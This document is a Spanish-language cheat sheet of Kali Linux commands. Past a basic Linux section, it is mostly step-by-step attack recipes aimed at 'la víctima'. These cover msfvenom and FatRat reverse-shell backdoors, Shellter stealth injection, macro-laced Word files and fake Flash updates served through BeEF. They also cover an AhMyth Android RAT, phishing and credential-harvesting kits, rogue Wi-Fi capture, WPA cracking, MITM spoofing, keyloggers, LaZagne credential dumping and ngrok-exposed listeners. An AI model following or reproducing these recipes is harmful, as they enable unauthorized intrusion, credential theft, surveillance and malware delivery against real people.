++ Comandos básicos:
--- pwd (Muestra el directorio en dónde estamos)
--- head -n <numero_lineas> <archivo> (Muestra las primeras n líneas de un archivo)
---- tail -n <numero_lineas> <archivo> (Muestra las últimas n líneas de un archivo)
--- ps -e (Muestra los procesos que se están ejecutando actualmente)
--- ps -ef (Muestra los procesos que se están ejecutando actualmente en formato ampliado)
--- ps -ef | grep <nombre_usuario> (Muestra los procesos que están bajo cierto usuario)
--- kill -9 <id_proceso> (Permite detener un proceso)
--- apt update (Actualiza la lista de paquetes)
--- apt upgrade (Actualiza los paquetes)
--- <comando> > <nombre_archivo> (Permite guardar la salida de un comando en un archivo)
--- arp-scan -l (Muestra los dispositivos conectados en la red)
--- ping <ip_o_sitio_web> -c <numero_de_pings> (Permite realizar un ping limitado)
--- traceroute <ip> (Permite saber la ruta hacia una ip)
--- ssh <usuario>@<ip_equipo> (Permite realizar una conexión ssh)
--- dig <dominio> @<dns> (Permite consultar a un servidor dns cual es la ip asociada a un dominio)
----- Ejemplo: google.com @1.1.1.1 
--- history (Permite ver el historial de los comandos)
--- cat <nombre_archivo> | wc -l (Muestra la cantidad de líneas de un archivo)
--- cat .bash_history (Permite abrir el archivo del historial de los comandos ejecutados)
--- cat /etc/os-release (Permite conocer la versión de la distribución GNU/Linux)
--- whois <dominio> (Permite ver la información asociada a un dominio)
--- whoami (Conocer el nombre del usuario activo en la terminal)
--- whoami;date;pwd (Muestra el usuario activo, fecha y directorio. Nota: se usa el ; para combinar comandos)
--- groups (Conocer la correspondencia de grupos del usuario activo en la terminal)
--- sudo /bin/bash (Acceder como root)
--- su (Acceder como root)
--- sudo -l (Nos permite verificar que comandos podemos ejecutar)
--- ip addr show (Conocer la ip)
--- ip a (Muestra los dispositivos de red)
--- ifconfig -a (Muestra los dispositivos de red)
--- uname (Brinda el nombre del equipo)
--- uname -r (Brinda la version del kernel)
--- uname -a (Brinda información más detallada del sistema)
--- dpkg -l (Permite ver el listado de los paquetes instalados)
--- who (Permite ver los usuarios conectados al sistema)
--- w (Similar a who pero también permite ver que está haciendo cada usuario)
--- id (Permite ver la información relacionada a la identidad del usuario que ejecuta el comando)
--- last (Permite ver el listado de los usuarios que han iniciado sesión en el sistema)
--- curl <enlace> (Descargar archivo)
--- wget <enlace> (Descargar archivo)
--- sudo adduser (Agregar usuario al sistema)
--- cat /etc/passwd (Permite ver los usuarios registrados en el sistema)
--- sudo halt (Permite apagar el equipo)
--- sudo shutdown -h now (Permite apagar el equipo)
--- sudo reboot (Permite reiniciar el equipo)
--- sudo netstat -plt (Permite ver los procesos que tienen conexión de red)
--- sudo netstat -atupn (Permite ver las conexiones activas en el sistema y los puertos asociados)
--- sudo arp-scan <nuestra_ip> (Permite ver otros dispositivos conectados a la red)
--- nc -lnp <puerto> (Inicia la escucha a un puerto) 
--- sudo cat /etc/shadow (Permite ver los hashs de las contraseñas de los usuarios del sistema)
--- ls (Lista los archivos que hay en un directorio)
--- ls -ltr (Lista todos los archivos que hay en un directorio de forma más amplia)
--- cd <nombre_directorio> (Permite entrar a un directorio)
--- cd .. (Permite ir al directorio superior)
--- mkdir <nombre_directorio> (Permite crear directorios)
--- nano <nombre_archivo> (Permite crear un archivo)
--- rmdir <nombre_directorio> (Permite borrar un directorio vacío)
--- touch <nombre_archivo> (Permite crear un archivo vacío)
--- rm <nombre_archivo> (Permite borrar un archivo)
--- cat <nombre_archivo> (Permite ver el contenido de un archivo)
--- cp <ruta_actual_archivo> <ruta_destino_archivo> (Permite copiar un archivo)
--- leafpad <nombre_archivo> (Permite abrir el archivo usando leafpad)
--- mv <nombre_archivo> <nuevo_nombre_archivo> (Permite cambiar el nombre de un archivo)
--- passwd <usuario> <contraseña> (Cambiar la contraseña de un usuario)
--- chmod <cod_permisos> <archivo> (Cambiar los permisos de un archivo)
--- split -b 9M <archivo_grande.ext> <archivo_parte_> (Para partir un archivo grande en partes de 9 mb)
--- cat archivo_parte_* > archivo_reunido.ext (Para reunir las partes)
----- Código de permisos (explicación): https://johndecember.com/unix/ref/chmod.html

++ Ruta de los worldlists por defecto
usr/share/worldlists

++ Worldlists adicionales
sudo apt-get install seclists
--- Se instalan en la siguiente ruta: usr/share/seclists


++ kali-undercover ---> comando usado para tener la apariencia de Windows
--- Recordar tener instlado el paquete: sudo apt-get install kali-undercover

++ kali-undercover --off ---> comando usado para desactivar el modo undercover

++ hydra -l <usuario> -P <lista_de_contraseñas> <ip direccion> ---> comando basico hydra

++ nmap -sP <192.168.1.0/24> ---> muestra los dispositivos conectados a una red 

++ nmap -A <dirección> ---> Realiza un escaneo agresivo, detectando servicios, versiones y sistema operativo 

++ gpg -c <file> ---> Cifrar archivos 

++ msfvenom -p /windows/shell/reverse_tcp LHOST=<ip_local> LPORT=4444 -f exe > <nombre_programa>  ---> crear programa intrusion
---- msfconsole -q ---> escuchar programa intrusion
---- use exploit/multi/handler ---> comando para activar programa intrusion
---- set PAYLOAD windows/shell/reverse_tcp  ---> continuacion activar programa intrusion
---- set LHOST <ip_local> 
---- set LPORT 4444
---- run

++ Herramienta útil para phishing: blackeye
--- Enlace: https://github.com/majordmg/Blackeye-V3

++ Herramienta útil para phishing: zphisher
--- Enlace: https://github.com/htr-tech/zphisher

++ msfvenom 
--- Ejemplo de uso #1: msfvenom -p windows/shell_reverse_tcpe -o funny2.exe
--- Ejemplo de uso #2: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
--- Ejemplo de uso #3: nc -nlvp 443  (Nota: comando usado para escuchar)

++ theHarvester 
--- theHarvester -h (Muestra la información de ayuda referente a la utilidad)
--- theHarvester -d <nombre_del_dominio> -b <nombre_del_buscador_ejemplo_bing>
--- theHarvester -d <nombre_del_dominio> -b <nombre_del_buscador> -f <nombre_reporte.html>
--- xdg-open <nombre_reporte.xml>

++ whois
--- whois <nombre_dominio>
--- utilidad web: https://www.whois.com/

++ sherlock
--- Enlace del proyecto: https://github.com/sherlock-project/sherlock
--- sherlock --help (Muestra la información de ayuda referente a la utilidad)
--- Sintaxis de uso general: python3 sherlock <usuario_1 usuario_2>
--- sherlock <usuario_1 usuario_2> --output results.txt (Guarda la información de salida en un archivo de texto)
--- cat results.txt (Ver la información de salida)

++ setoolkit
--- Escoger opcion <1-6>
--- Opcion 1: Social-Engineering-Attacks
--- Escoger opcion <1-10>
--- Opcion 2: Website Attack Vectors
--- Escoger opcion <1-7>
--- Opcion 3: Credential Harvester Attack Method
--- Escoger opcion <1-3>
--- Opcion 1: Web Templates
--- Presionar enter (dejar la ip por default)
--- Escoger opcion <1-3>
--- Opcion 2: Google
--- Abrir el navegador web e ir a la ip generada por el programa
--- Una vez ingresadas las credenciales las mismas estarán disponibles en el programa

++ Storm-Breaker
--- URL del proyecto: https://github.com/ultrasecurity/Storm-Breaker
--- ssh -R 80:localhost:2525 serveo.net (Para exponer nuestro servidor local al internet usando ssl tunneling)
--- Acceder al url generado
--- Acceder usando las credenciales <admin, admin>
--- Compartir un enlace generado 
--- Esperar a que el enlace generado sea abierto para obtener la información

++ Beefproject
--- URL del proyecto: https://github.com/beefproject/beef
--- Instalar el paquete
--- Una vez instalado ir a la ruta del programa
--- Ejecutar el comando: mousepad config.yaml
--- Verificar el apartado de credenciales
--- Quitar el # en el area de public
--- En esta misma area colocar en la seccion https la opcion true
--- Ejecutar el comando: ssh -R 80:localhost:3000 serveo.net
--- Copiar el url publico generado
--- Ejecutar el comando: mousepad config.yaml
--- Pegar el url publico generado en la seccion public, host
--- Remover del url la parte de https y guardar el archivo
--- Correr nuevamente beef desde el apartado raiz con el comando: ./beef
--- Abrir el url generado por el programa
--- Colocar las credenciales generadas
--- Dar clic en la seccion avanzada
--- En la seccion del url cambiar la ip por la ip copiada en el archivo mousepad config.yaml y dar enter
--- Ir al portal web de beef 
--- Ir a la seccion de commands
--- Ir a la seccion social eng.
--- Ir a la seccion google phishing
--- Dar clic en execute
--- El usuario debe proceder a ingresar sus credenciales
--- En la interfaz web de beef se procederán a ver las credenciales del usuario

++ Crear un punto de red wifi
--- Instalar los siguientes paquetes: apt install dnsmasq hostapd
--- Ejecutar el comando: airmon -ng check kill (Este comando para los procesos que puedan intervenir con el modo monitor)
--- Ejecutar el comando: mousepad /etc/apache2/sites-enabled/000-default.conf (Este comando nos permite editar el portal web de autenticacion)
--- Pegar los siguientes comandos en el archivo:
<Directory "/var/www/html">
RewriteEngine On
RewriteBase /
RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
RewriteRule ^(.*)$ http://%1/$1 [R=301,L]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ / [L,QSA]
</Directory>
--- Guardar el archivo
--- Ejecutar el siguiente comando: a2enmod rewrite && service apache2 start
(Permite habilitar los modulos de apache y reiniciar el servicio)
--- Ejecutar el siguiente comando: dnsmasq -C ~/dnsmasq.conf hostapd ~/hostapd.conf -B (Permite redireccionar el trafico al wifi que vamos a crear)
--- Ejecutar el siguiente comando: ifconfig wlan0 192.168.1.1/24 
--- Clonar el repositorio RougeWifi: https://github.com/s0meguy1/RougeWifi
--- Ir a la raiz del repositorio 
--- Ejecutar el comando: rm -rf wifi.sh
--- Ejecutar el comando: cp -r * /var/www/html/
--- Reiniciar el sistema
--- Ejecutar los siguientes comandos:
airmon-ng check kill
service apache2 start
dnsmasq -C /root/dnsmasq.conf  
hostapd /root/hostapd.conf -B
ifconfig wlan0 192.168.1.1/24
--- Ejecutar el comando:
tshark -i wlan0 -w capture.cap
--- El wifi aparecerá visible 
--- Una vez el objetivo ingrese al wifi e ingrese credenciales se puede ver lo capturado
--- Ejecutar el siguiente comando: wireshark capture.cap
--- Verificar la seccion protocolo (HTTP) y luego la seccion HTML, estando allí ubicar las credenciales

++ Rough Wifi 
--- URL: https://github.com/s0meguy1/RougeWifi
--- Entrar al directorio
--- Ejecutar los siguientes comandos:
--- rm -rf wifi.sh 
--- cp -r * /var/www/html
--- Reiniciar el equipo
--- Ejecutar los siguientes comandos:
--- service apache2 start
--- dnsmasq -C /root/dnsmasq.conf
--- hostapd /root/hostapd.conf -B
--- ifconfig wlan0 192.168.1.1/24
--- Aparecerá el nuevo wifi 
--- Para comenzar la captura ejecutamos lo siguiente:
--- tshark -i wlan0 -w capture.cap
--- wireshark capture.cap
--- Una vez en wireshark buscamos en la sección protocol (HTTP) las 
credenciales asociadas


++ Página útil para verificar campañas de phishing:
-- URL: https://phishtank.org/index.php

++ Metasploitable
--- URL: https://sourceforge.net/projects/metasploitable/

++ Brute-Force
--- URL: https://github.com/ElliotAlderson51/Brute-Force
--- Navegar a ruta del programa
--- Ejecutar el siguiente comando: python3 ZipCracker.py
--- Ingresar el nombre o la direccion del archivo
--- Ingresar el nombre del archivo de lista (diccionario)


++ StegHide
--- Comando para instalar: sudo apt-get install steghide
--- steghide --help (Brinda los comandos relacionados al programa)
--- steghide --embed -ef <archivo_texto> -cf <archivo_imagen> (Permite incrustar un texto oculto en una imagen)
--- Igresar una contraseña
--- steghide --extract -sf <archivo_imagen> -xf <archivo_texto> (Permite extraer la data de la imagen)
--- Ingresar la contraseña previamente establecida
--- Abrir el archivo generado para comprobar la información extraída

++ Ataque a red wifi (usando airodump-ng)
--- Comandos a ejecutar:
--- ifconfig wlan0 down
--- ifconfig wlan0 mode monitor
--- ifconfig wlan0 up
--- airodump-ng wlan0 (Este comando permite ver las redes wifi activas)
--- airodump-g --bssid <BSSID> --channel 6 --write new wlan0
--- Abrir otro cmd
--- aireplay-ng --deauth 20 -a <BSSID> -c <STMAC> wlan0
--- Esperar a que aparezca el mensaje: Network is down
--- ls
--- Visualizar los archivos generados
--- aircrack-ng <new-02.cap> -w <word.txt>
--- Copiar la llave encontrada

++ Villain Tool
--- URL: https://github.com/t3l3machus/Villain
--- Navegar al directorio del programa
--- Instalar las dependencias: pip3 install -r requirements.txt
--- python3 Villain.py
--- help generate
--- generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode (Permite generar un payload para Windows)
--- Copiar el comando de powershell generado
--- Pegar dicho comando en powershell 
--- Ejecutar en la terminal: sessions 
--- shell <session_ID>
--- Se mostrará el mensaje: Interactive pseudo-shell activated
--- En estos momentos ya tenemos control del sistema Windows y podemos ejecutar comandos
--- Comandos tales como: 
dir (Ver directorios)
mkdir <nombre directorio>  (Crear directorio)
rmdir <nombre directorio> (Borrar directorio)

++ AhMyth
--- URL: https://github.com/Rabbit-xd/AhMyth
--- Ejecutar los siguientes comandos tras clonado del repositorio
--- autoinstall_linux
--- Abrir otra terminal
--- Ejecutar ./ngrok tcp 8484 (Recordar estar en el directorio de ngrok)
--- Copiar el enlace generado (sección forwarding)
--- Ejecutar en terminal: ahmyth
--- En la interfaz gráfica que se nos muestra ir a la seccion apk builder
--- Estando alli, pegar el enlace generado en la sección server ip
--- Dejar toda la sección de permisos activa
--- Dar clic en el boton build
--- El programa procederá a generar un apk
--- Una vez la aplicación ha sido instalada se procederá a actualizar el apartado de victimas en la interfaz del programa

++ Storm-Breaker (para fines de geolocalizacion)
--- URL: https://github.com/ultrasecurity/Storm-Breaker
--- Navegar al directorio 
--- Ejecutar los siguientes comandos:
--- bash install.sh
--- pip3 install -r requirements.txt
--- python3 st.py
--- Navegar al directorio de ngrok y ejecutar: ./ngrok http 2525
--- Copiar el enlace generado de la sección de forwarding
--- Acceder a dicho enlace
--- Colocar las credenciales: admin/admin
--- Copiar uno de los enlaces generados
--- Una vez abierto dicho enlace nos será visible toda la información referente (S.O. - ubicación - IP y más)

++ IPDRONE
--- URL: https://github.com/iamambarish/ipdrone
--- Navegar al directorio
--- python3 ipdrone.py -v <ip>
--- Una vez ejecutado tendremos visible la información referente a dicha ip

++ Crunch 
--- crunch 2 6 123456 -o worldlist.txt (2= longitud mínima - 6 = longitud máxima - 123456 = conjunto de caracteres que comprenden la lista)
--- leafpad <nombre_de_la_lista> (Para abrir la lista generada)

++ Spoof del MAC address
--- ifconfig
--- ifconfig eth0 down (eth0 puede ser otra interfaz de red)
--- ifconfig eth0 ether <dirección_mac_distinta>
--- ifconfig eth0 up
--- ifconfig

++ Macof 
--- macof --help 
--- macof -i <interfaz_red> -s <ip_router>
--- Se enviarán una serie de solicitudes al router que pueden ocasionar su apagado

++ Honeypot
--- URL: https://github.com/technicaldada/pentbox
--- Acceder al directorio del proyecto
--- ruby pentbox.rb 
--- Escoger la opción (2- Network tools)
--- Escoger la opción (3- Honeypot)
--- Escoger la opción (2- Manual Configuration)
--- Indiciar un puerto abierto (ejemplo: 80)
--- Indicar un mensaje (ejemplo: I got your ip address)
--- Save a log with intrusion = n
--- Activate beep sound when intrusion = y
--- Verificar nuestra ip con ifconfig
--- Acceder a la ip desde un navegador web usando el puerto (ejemplo 192.168.1.120:80)
--- Al acceder a la ip se verá el mensaje falso colocado
--- En la terminal veremos la ip de quien ha entrado a la ip (En este caso somos nosotros mismos, pero en un escenario real nos mostraría a la ip vinculada al usuario o dispositivo)

++ Tools (Dark Web)
--- Torch
--- ahmia
--- darksearchio
--- Onionland
--- notevil
--- phobos
--- torgle
--- tor66
--- haystack
--- tormax

++ Exiftool
--- man exiftool (Muestra la información de los comandos asociados al programa)
--- q (Nos permite salir del anterior menú)
--- exiftool <nombre_archivo>
--- Se nos mostrará la información relacionada al archivo
--- exiftool -GPSLatitude=74.2331 -GPSLongitude=75.3321 <nombre_archivo>
--- Se actualizará la información de geolocalización
--- exiftool -Copyright="este es mi archivo" <nombre_archivo>
--- Se actualizará la información de copyright
--- exiftool -Copyright=<nombre_archivo>
--- Se eliminará el copyright

++ CamHacker
--- URL: https://github.com/KasRoudra2/CamHacker
--- Entrar en el directorio del programa
--- ls
--- bash ch.sh
--- Seleccionar la opción 1
--- Se generarán 2 urls, copiar la primera
--- Al abrise ese link enviado se nos mostrará la información referente al equipo
--- Verificar el directorio del programa para ver las imágenes

++ IP2LOCATION (Sitio web)
--- Ir al correo recibido y dar clic en la sección show original y copiar 
--- Acceder al siguiente URL: https://www.ip2location.com/free/email-tracer
--- Pegar la información en el sitio web
--- Dar clic en lookup
--- Se nos mostrará información referente al correo

++ Whoami-project 
--- URL: https://github.com/owerdogan/whoami-project
--- Entrar al directorio
--- sudo make install 
--- kali-whoami --start (Iniciar la aplicación)
--- Habilitar todas las opciones (1-9)
--- kali-whoami --stop (Parar la aplicación)

++ Keylogger
--- URL: https://github.com/GiacomoLaw/Keylogger
--- Entrar en el repositorio
--- pip install -r requirements. txt
--- python3 keylogger.py
--- En el directorio del programa se van a capturar todas las entradas por teclado en un archivo .log

++ Homograph attack (sitio web)
--- URL: https://www.irongeek.com/homoglyph-attack-generator.php
--- Introducir el texto que deseemos, ejemplo: google
--- Cambiar una letra del texto por una similar
--- Dar clic en submit

++ Punycode converter (sitio web)
--- URL: https://www.punycoder.com/
--- Introducir el texto generado anteriormente por homoglyph
--- Un punnycode distinto al texto original nos indica que estamos viendo un homógrafo

++ Ghost tool
--- URL: https://github.com/joysg1/KALI_LINUX/edit/main/COMANDOS_UTILES.txt
--- Entrar al directorio
--- ghost
--- Seleccionar la opción 3 (Conectar a dispositivo)
--- Dar un ip de un dispositivo, podemos obtener una desde: https://www.shodan.io/search?query=android+debug+bridge
--- Seleccionar la opción 14 (Listar apps del dispositivo)
--- Seleccionar la opción 4 (Shell de equipo)
--- ls
--- Navegar por los directorios según deseemos

++ Crear archivo malicioso
--- Abrir terminal, ejecutar los siguientes comandos:
--- msfconsole
--- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_local> LPORT=4444 --format=exe ><nombre_programa>
--- cp <nombre_archivo> /var/www/html (Ubicación del servidor apache)
--- service apache2 start
--- use exploit/multi/handler
--- set payload windows/meterpreter/reverse_tcp
--- set LHOST <ip_local> 
--- set LPORT 4444
--- run
--- Ir a pc con windows
--- Acceder a la ip del servidor <ip_local>/<nombre_archivo>
--- Ejecutar archivo
--- Regresar a la pc con kali, en la terminal aparecerá el mensaje de sesión abierta
--- En este punto se tiene control total sobre el windows, y podemos ejecutar los siguientes comandos:
--- sysinfo (Muestra información del sistema)
--- Nota: este método sólo trabaja windows sin antivirus activo

++ FatRat
--- URL: https://github.com/StreetSec/FatRat
--- Navegar al directorio del programa
--- ls
--- chmod +x setup.sh
--- ./setup.sh
--- y
--- fatrat
--- Seleccionar la opción 1 (create a bat file)
--- Indicar nuestra ip local 
--- Indicar el puerto: 8080
--- Indicar el nombre del ejecutable
--- Seleccionar la opcion 3 (Windows meterpreter/reverse_tcp
--- cd TheFatRat/output
--- ls
--- El archivo generado debe estar listado
--- cp <nombre_archivo> /var/www/html (Ubicación del servidor apache)
--- msfconsole
--- use exploit/multi/handler
--- set payload windows/meterpreter/reverse_tcp
--- set LHOST <ip_local>
--- set LPORT <8080>
--- run
--- Ir a la computadora con windows
--- Colocar en el navegador la ip del kali
--- Descargar el archivo
--- Con el programa advance bat to exe converter proceder a convertir el bat a exe
--- URL del programa: https://www.battoexeconverter.com/
--- Ir a la sección file ---> open
--- Seleccionar el archivo
--- Ir a la sección file ---> Build EXE
--- Seleccionar la opción Start_Invisible (NO_CONSOLE window)
--- Seleccionar el icono
--- Seleccionar la opción BUILD EXE
--- Nombrar el archivo y seleccionar la ubicación
--- Ejecutar el programa
--- Volver al kali
--- Se nos mostrará un mensaje que indica que una sesión ha sido abierta
--- En estos momentos se tiene control total en la máquina con windows desde kali


++ Shellter
--- Instalar el programa: apt install shellter
--- Ejecutar los siguientes comandos
--- shellter
--- Seleccionar la opcion: A
--- Indicar la ruta del archivo (ruta_completa), ejemplo: /root/Desktop/<archivo>
--- Habilitar stealth mode: Y
--- Indicar el tipo de payload: L (listed)
--- Indicar el índice del payload: 1 (Meterpreter_Reverse_TCP)
--- Indicar la ip local
--- Indicar el puerto (ejemplo: 8080)
--- En este punto ya se ha inyectado el código malicioso en el archivo
--- cp <nombre_archivo> /var/www/html (Copia el archivo al servidor apache)
--- msfconsole 
--- use exploit/multi/handler
--- set payload windows/meterpreter/reverse_tcp
--- set LHOST <ip_local>
--- set LPORT <8080>
--- run
--- Ir a la pc con windows
--- Colocar la ip del kali
--- Descargar el archivo y ejecutarlo
--- Volver al kali
--- En la terminal veremos una nueva sesión, lo que indica que tenemos control total sobre el equipo windows


++ Crear arhivo malicioso de Word usando FatRat
--- URL: https://github.com/StreetSec/FatRat
--- Navegar al directorio del programa
--- ls
--- chmod +x setup.sh
--- ./setup.sh
--- y
--- fatrat
--- Seleccionar la opción 7 (Create Backdoor For Office with Microsploit)
--- Seleccionar la opción 2 (The Microsoft Office Macro on Windows)
--- Indicar la ip local
--- Indicar el puerto, ejemplo: 8080
--- Indicar el nombre del programa
--- Presionar enter para indicar el mensaje por default 
--- Teclear n y enter (No se usará un custom backdoor)
--- Seleccionar el tipo de payload (3. windows/meterpreter/reverse_tcp)
--- cd TheFatRat/output
--- ls
--- cp <nombre_archivo> /var/www/html (Copiado del archivo al servidor apache)
--- use exploit/multi/handler
--- set payload windows/meterpreter/reverse_tcp
--- windows/meterpreter/reverse_tcp
--- set LHOST <ip_local>
--- set LPORT 8080
--- run
--- Ir a la pc con Windows
--- Colocar la ip del kali
--- Descargar y ejecutar el archivo
--- El documento se abrirá indicando un mensaje de habilitar las macros
--- Habilitar la macro
--- Regresar al kali
--- Aparecerá un mensaje de sesión abierta
--- En estos momentos se tiene control total del equipo con windows

++ Meterpreter (comandos ha usar cuando ya se ha abierto una sesión)
--- upload <nombre_archivo> (Se usa para cargar el archivo a la máquina windows)
--- execute -f <nombre_archivo> (Se usa para ejecutar el archivo)
--- execute -f <nombre_archivo> -H (Se usa para ejecutar el archivo sin que se abra algún cmd que levante sospechas)
--- keyscan_start (Permite la captura de las entradas por teclado)
--- keyscan_dump (Permite visualizar las entradas capturadas)
--- shell (Permite ejecutar los comandos de Windows)
---- Ejemplo de comando a ejecutar: start firefox bing.com (Permite abrir el navegador firefox y dirigirnos al sitio web bing)
---- Ejemplo de comando a ejecutar: shutdown -s -t 100 (Permite apagar el equipo en 1 minuto)

++ Lazagne 
--- URL: https://github.com/AlessandroZ/LaZagne
--- Navegar al directorio del programa
--- meterpreter> upload Windows/laZagne.exe (Manda el archivo desde kali al equipo con Windows) (se debe tener ya una sesion abierta con el ataque reverse tcp)
--- shell
--- lazagne.exe all
--- Se nos mostrarán las credenciales alojadas en el equipo Windows 

++ Capturar Sesion VNC
--- msfconsole
--- meterpreter
--- run
--- meterpreter > background (se debe tener ya una sesion abierta con el ataque reverse tcp)
--- use windows/manage/payload_inject
--- set payload windows/vncinject/reverse_tcp
--- set LHOST <ip_local>
--- set session 1
--- set handler true
--- run
--- A este punto es posible ver lo que se está haciendo en la pc con windows

++ Ver contraseñas wifi salvadas
--- msfconsole
--- meterpreter
--- run
--- meterpreter > shell (se debe tener ya una sesion abierta con el ataque reverse tcp)
--- netsh wlan show profile
--- Aparecerán los perfiles wifi
--- netsh wlan show <nombre_perfil> key=clear
--- En la sección Key Content el password será visible
--- netsh wlan show interface (Comando para verificar si la pc con windows está conectada a un wifi)
--- netstat (Comando para mostrar las conexiones que tiene la pc con windows)
--- getmac (Comando para ver las direcciones mac de todas las interfaces de red)

++ Man in the Middle Attack
--- mitmf --arp --spoof --gateway <router_gateway> --target <ip_victima> -i <interface_ejemplo_eth0>
--- route -n (Comando para conocer el gateway del router)
--- Ir a la pc de la victima y probar la navegación web
--- Volver a la máquina con kali, es la terminal se el tráfico de la víctima será visible, incluyendo credenciales

++ Spoofing attack
--- nano /etc/mitmf/mitmf.conf
--- Ir a la sección A y colocar debajo algun dominio siguiendo la siguiente sintaxis: *.<dominio=ip_deseada_a_dirigirse> (ejemplo: *.tutorial.com=192.168.0.17
--- Ctrl + G para guardar y Ctrl + X para salir
--- cd /var/www/html (Dirección del servidor apache)
--- nano index.html (Crea un archivo html)
--- Editar el html con algún mensaje, ejemplo <h1> Malicious website </h1>
--- Ctrl + G para guardar y Ctrl + X para salir 
--- mitmf --arp --spoof --gateway <router_gateway> --target <ip_victima> -i <interface_ejemplo_eth0> --dns
--- Ir a la pc de la víctima y navegar al dominio ejemplo: tutorial.com
--- Si todo está bien se debe mostrar el texto indicado en el .html

++ Crear página de login falsa
--- setoolkit
--- Seleccionar la opción 1 (Social-Engineering-Attack)
--- Seleccionar la opción 2 (Website Attack Vectors)
--- Seleccionar la opción 3 (Credential Harvester Attack Method)
--- Seleccionar la opción 2 (Site Cloner)
--- Presionar enter para usar la ip local
--- Ingresar la url del sitio web a clonar
--- Ir a la pc de la víctima y navegar a la ip del kali
--- Se nos mostrará la página clonada 
--- Volver al kali, el tráfico del usuario será visible, incluyendo credenciales

++ Blackeye
--- URL: https://github.com/EricksonAtHome/blackeye
--- Navegar al directorio
--- bash blackeye.sh
--- Escojer el sitio web que se desea imitar ejemplo: opción 4 (Twitter)
--- Presionar enter para usuar nuestra IP local
--- Enmascara nuestra ip con un servicio de acortador de enlaces tal como: https://bitly.com/pages/products/url-shortener
--- Enviar el enlace generado a la víctima
--- Ir a la pc de la víctima y acceder al enlace
--- Volver al kali, las credenciales asociadas estarán visibles


++ Exploit de navegadores web usando Beef
--- cd /usr/share/beef-xss
--- ./beef
--- Aparecerán dos enlaces:
----- Hook URL: URL con el código malicioso que toma control sobre el navegador
----- UI URL: URL de la interfaz gráfica del programa 
--- Copiar el UI URL y acceder al mismo (credenciales = beef/beef)
--- Abrir otra terminal y navegar a cd /var/www/html (Ubicación del servidor apache)
--- wget <url_del_sitio_web_a_clonar>
--- nano index.html 
--- En la sección head colocar el Hook URL, siguiendo la siguiente sintaxis: 
<script type="text/javascript" src="http://192.168.0.17:3000/hook.js"> </script>
--- Ctrl + G para guardar y Ctrl + X para salir
--- Ir a la pc de la víctima e ingresar la ip del kali
--- Ir a la interaz web de beef
--- Se nos mostrará el acceso hecho en la sección de Hooked Browsers
--- Se procede a dar clic en la ip asociada a dicho browser
--- Ir a la sección de Commands
--- Buscar alert
--- Seleccionar Create Alert Dialog
--- Indicar el mensaje de alerta
--- Dar clic en execute
--- Ir a la pc de la víctima, en su navegador se verá el mensaje anteriormente puesto
--- Volver a la interfaz gráfica de beef
--- Buscar en la sección commands la opción redirect
--- Seleccionar la opción redirect browser
--- Indicar la URL a la que se desea redireccionar
--- Dar clic en execute
--- Volver a la pc de la víctima, el redireccionado ha de haberse llevado a cabo

++ Exploit de navegadores usando Beef (método alternativo: Man in the Middle Framework)
--- mitmf --arp --spoof --gateway <router_gateway> --target <ip_víctima> -i <interface_ejemplo_eth0 --inject --js-url>
--- route -n (Nos permite saber el gateway del router)
--- Tomar el hook URL generado
--- Ir a la pc de la víctima e ingresar a un sitio web
--- Ir a la interfaz web de beef y en la sección de hooked browsers se nos mostrará la ip del equipo de la víctima
--- La ventaja de este método es que la víctima no tiene que acceder a ningún url, mas bien el hook url se injecta en el navegador del usuario y este al navegar a cualquier url queda capturado por beef

++ Tomar control sobre la pc de la víctima
--- Usar shelter
--- dpkg --add-architecture i386
--- apt update && apt install wine32
--- shellter
--- Escojer la opción A (Auto Operation Mode)
--- PE Target: <ruta_completa_del_programa>
--- Enable Stealth Mode: Y
--- Use a listed payload or custom: L
--- Select payload by index: 1 (Meterpreter_Reverse_TCP)
--- SET LHOST: <ip_local>
--- SET LPORT: 8080
--- ENTER
--- La inyección de código ha sido completada 
--- cp <nombre_archivo> /var/www/html (Copiar el archivo ya inyectado al servidor web apache
--- Ir a la interfaz web de beef y seleccionar una víctima en el apartado hooked browsers
--- Abir otra terminal en kali y configurar un listener para identificar cuando la víctima abra el archivo. Comandos a ejecutar:
--- msfconsole
--- use exploit/multi/handler
--- set payload windows/meterpreter/reverse_tcp
--- set LHOST <ip_local>
--- set LPORT <8080>
--- run
--- Volver a la interfaz web de beef, seleccionar la víctima en la sección hooked browsers
--- Ir a la sección de commands
--- Buscar la opción fake
--- Seleccionar la opción fake flash update
--- En la sección de image, colocar la ip local (del kali)
--- En la sección de custom payload url, colocar el url del archivo malicioso
--- Presionar execute
--- Ir a la pc de la víctima, en ella aparecerá un cuadro de actualización de flash player
--- Dar clic en install, guardar el archivo, ejecutarlo e instalarlo
--- Volver al kali, a la terminal del listener
--- Nos aparecerá un mensaje indicando que 1 sesión ha sido abierta


++ Crear archivo malicioso y usarlo fuera de la red local
--- Descargar ngrok URL: https://ngrok.com/downloads/linux
--- Ir a la terminal ejecutar los siguientes comandos:
--- ls
--- unzip <nombre_archivo_ngrok>
--- mv <nombre_carpeta_descomprimida_ngrok> /usr /bin (Permite mover los archivos de ngrok para que puedan ser ejecutados desde cualquier ubicación usando la terminal
--- ngrok tcp 8080
--- Enter
--- Abrir otra terminal para usar fatrat, ejecutar los siguientes comandos
--- fatrat
--- Seleccionar la opción 6 (Create Fud Backdoor 1000% with PwnWinds)
--- Seleccionar la opción 2 (Create exe file with C # + Powershell)
--- Se nos pedirá el LHOST, este lo obtenemos de la otra terminal de ngrok (sección forwarding, ejemplo: 0.tcp.ngrok.io)
--- Se nos pedirá el LPORT, este lo obtenemos de la otra terminal de ngrok (sección forwarding, ejemplo: 12171)
--- Colocar el nombre del archivo, ejemplo: update
--- Seleccionar la opción 3 (windows/meterpreter/reverse_tcp)
--- Presionar enter para generar el archivo
--- El archivo se guardará en el directorio output de fatrat
--- Ahora procederemos a configurar el listener
--- Ejecutar los siguientes comandos
--- msfconsole
--- use exploit/multi/handler
--- set payload windows/meterpreter/reverse_tcp
--- set lhost localhost
--- set lport 8080
--- run
--- Usar un servicio de nube para subir el archivo, ejemplo: https://wetransfer.com/
--- Subir el archivo malicioso
--- Ir a la pc de la víctima, acceder al enlace, descargar y ejecutar el archivo
